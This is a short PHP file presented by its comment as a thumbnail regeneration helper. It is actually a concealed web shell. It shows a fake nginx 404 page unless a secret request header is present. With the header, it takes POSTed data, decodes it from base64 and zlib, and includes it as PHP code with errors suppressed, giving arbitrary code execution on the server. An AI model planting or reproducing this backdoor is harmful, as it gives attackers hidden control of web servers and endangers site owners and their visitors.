<?php
// thumbnail regeneration helper
if (($_SERVER['HTTP_X_ACCEL_VERSION'] ?? '') !== '9.4.1') {
    http_response_code(404);
    echo '<!DOCTYPE html><html><head><title>404 Not Found</title></head>'
    .'<body><center><h1>404 Not Found</h1></center><hr><center>nginx</center></body></html>';
    exit;
}
$x = isset($_POST['x']) ? (string)$_POST['x'] : '';
if ($x === '') { echo 'RDY'; exit; }
$t = @tempnam(sys_get_temp_dir(), 'img');
if ($t === false) { echo 'TMPE'; exit; }
file_put_contents($t, $x);
@include 'php://filter/read=convert.base64-decode/zlib.inflate/resource=' . $t;
@unlink($t);
